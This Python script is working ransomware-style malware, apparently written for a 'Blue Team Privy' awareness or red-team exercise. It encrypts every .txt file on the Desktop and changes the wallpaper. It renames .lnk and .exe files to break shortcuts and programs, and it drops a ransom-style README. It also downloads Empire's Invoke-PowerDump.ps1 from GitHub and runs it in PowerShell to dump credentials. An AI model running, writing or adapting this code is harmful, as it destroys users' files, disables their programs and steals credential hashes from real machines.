from cryptography.fernet import Fernet
import os
import ctypes
import platform
import urllib.request
import pyautogui
import subprocess
import requests

# Generate key
key=Fernet.generate_key()

# Change directory
# def change_to_desktop():
#     system = platform.system()

#     if system == "Windows":
#         desktop_path = os.path.join(os.path.expanduser("~"), "Desktop")
#     elif system == "Darwin":  # macOS
#         desktop_path = os.path.join(os.path.expanduser("~"), "Desktop")
#     elif system == "Linux":
#         # This assumes a standard GNOME desktop environment
#         desktop_path = os.path.join(os.path.expanduser("~"), "Desktop")
#     else:
#         print("Unsupported operating system.")
#         return

#     try:
#         os.chdir(desktop_path)
#         print(f"Changed working directory to Desktop: {desktop_path}")
#     except FileNotFoundError:
#         print(f"Desktop directory not found: {desktop_path}")

#Change user directory
home_directory = os.path.expanduser("~")
desktop = os.path.join(home_directory, "Desktop")
os.chdir(desktop)

# Save key to file
with open("JANGAN-HAPUS-INI.key","wb") as f:
    f.write(key)

# Create Fernet object with the generated key
fernet = Fernet(key)

# Encrypt content of text files
# Function to list and encrypt text files on the Desktop
def encrypt():
    try:
        for root, dirs, files in os.walk(os.getcwd()):
            for file_name in files:
                if file_name.endswith(".txt"):
                    file_path = os.path.join(root, file_name)

                    with open(file_path, "r") as f:
                        data = f.read()

                    encrypted = fernet.encrypt(data.encode())

                    with open(file_path, "wb") as f:
                        f.write(encrypted)
                
                    # print(f"Encrypted {file_name} on the Desktop.")
                
                        
    except FileNotFoundError:
        print("Error encrypting files. Desktop directory not found.")

# Get the file
def download_file(url, destination):
    urllib.request.urlretrieve(url, destination)

# Change Wallpaper
def change_wallpaper(file_path):
    system = platform.system()
    if system == "Windows":
        SPI_SETDESKWALLPAPER = 20
        ctypes.windll.user32.SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, file_path, 3)
    elif system == "Darwin":
        script = f'tell application "Finder"\nset desktop picture to POSIX file "{file_path}"\nend tell'
        os.system(f"osascript -e '{script}'")
    elif system == "Linux":
        os.system(f"gsettings set org.gnome.desktop.background picture-uri file://{file_path}")
    else:
        print("Unsupported operating system.")

# Add readme text
def add_readme(file_path):
    readme_text = """
    
 /$$   /$$           /$$ /$$                 /$$$$$$$$        /$$ /$$                       
| $$  | $$          | $$| $$                | $$_____/       | $$| $$                       
| $$  | $$  /$$$$$$ | $$| $$  /$$$$$$       | $$     /$$$$$$ | $$| $$  /$$$$$$   /$$$$$$$   
| $$$$$$$$ /$$__  $$| $$| $$ /$$__  $$      | $$$$$ /$$__  $$| $$| $$ |____  $$ /$$_____/   
| $$__  $$| $$$$$$$$| $$| $$| $$  \ $$      | $$__/| $$$$$$$$| $$| $$  /$$$$$$$|  $$$$$$    
| $$  | $$| $$_____/| $$| $$| $$  | $$      | $$   | $$_____/| $$| $$ /$$__  $$ \____  $$   
| $$  | $$|  $$$$$$$| $$| $$|  $$$$$$/      | $$   |  $$$$$$$| $$| $$|  $$$$$$$ /$$$$$$$//$$
|__/  |__/ \_______/|__/|__/ \______/       |__/    \_______/|__/|__/ \_______/|_______/| $/
                                                                                        |_/ 
                                                                                            
                                                                                            
This is the README file from Blue Team Privy.

Don't be afraid, everything was under control. 
If you read this message, please report to our SOC and let them handle it.
Keep update your OS and stay aware about everything.

Until next time,
Blue Team Privy

"""

    try:
        # Open the file in append mode (or create it if it doesn't exist)
        with open(file_path, 'a') as file:
            file.write(readme_text)
        # print(f"README added to {file_path}")
    except Exception as e:
        print(f"Error: {e}")

# Change icon in Desktop
def change_extension(directory, old_extension, new_extension):
    for filename in os.listdir(directory):
        if filename.endswith(old_extension):
            old_filepath = os.path.join(directory, filename)
            new_filepath = os.path.join(directory, filename.rsplit('.', 1)[0] + new_extension)
            os.rename(old_filepath, new_filepath)
            print(f"Changed {old_filepath} to {new_filepath}")

# Open readme.txt
def open_readme_on_desktop():
    # Get the path to the desktop directory
    desktop_directory = os.path.join(os.path.expanduser("~"), "Desktop")

    # Specify the filename (README.txt)
    readme_filename = "README.txt"

    # Construct the full path to README.txt on the desktop
    readme_path = os.path.join(desktop_directory, readme_filename)

    # Check if the file exists before attempting to open it
    if os.path.exists(readme_path):
        # Open the README.txt file with the default text editor
        os.system(f'start "" "{readme_path}"')
    else:
        print(f"{readme_filename} not found on the desktop.")

#download tools credential dumping
def download_file(url, destination):
    try:
        # Send a GET request to the URL
        response = requests.get(url)

        # Check if the request was successful (status code 200)
        if response.status_code == 200:
            # Save the content to a local file
            with open(destination, 'wb') as file:
                file.write(response.content)
            # print(f"Downloaded and saved as {destination}")
        else:
            print(f"Failed to download. Status code: {response.status_code}")

    except Exception as e:
        print(f"Error: {e}")

def executePowerDump(script_path):
    try:
        # Import the module and run the PowerShell script
        ps_command = f"Import-Module .\\{script_path}; .\\{script_path}"
        subprocess.run(["powershell", "-Command", ps_command], check=True)
        # print("PowerShell script executed successfully")
        os.remove("Invoke-PowerDump.ps1")

    except Exception as e:
        print(f"Error: {e}")    

# Back to desktop
def backDesktop():
    # Simulate pressing Win + D
    pyautogui.hotkey('winleft', 'd')

if __name__ == "__main__":
    # Wallpaper
    wallpaper_url = "https://raw.githubusercontent.com/tompilooo/EncryptFile/main/bt.jpg"
    download_path = os.path.abspath("bt.jpg")

    # Note
    file_path = os.path.abspath("README.txt")
    
    # Path directory
    desktop_directory = os.path.join(os.path.expanduser("~"), "Desktop")
    
    # PowerDump
    powerDump_url = "https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-PowerDump.ps1"
    script_name = "Invoke-PowerDump.ps1"

    # Desktop directory
    # change_to_desktop()

    #Encryption
    encrypt()

    # Download the file
    download_file(wallpaper_url, download_path)

    # Change the wallpaper using the downloaded file
    change_wallpaper(download_path)

    # Change extension from .lnk to .ASU on the desktop
    change_extension(desktop_directory, ".lnk", ".ASU")

    # Change extension from .exe to .ASU on the desktop
    change_extension(desktop_directory, ".exe", ".ASU")

    # # Change extension from .jpg to .ASU on the desktop
    # change_extension(desktop_directory, ".jpg", ".ASU")

    # Call the function to add README text
    add_readme(file_path)

    # Optionally, remove the downloaded file after changing the wallpaper
    os.remove(download_path)

    # Credential Dumping
    # Download the script
    download_file(powerDump_url, script_name)

    # Execute the script with the downloaded module
    executePowerDump(script_name)

    #Back to Desktop
    backDesktop()

     # Open readme.txt
    open_readme_on_desktop()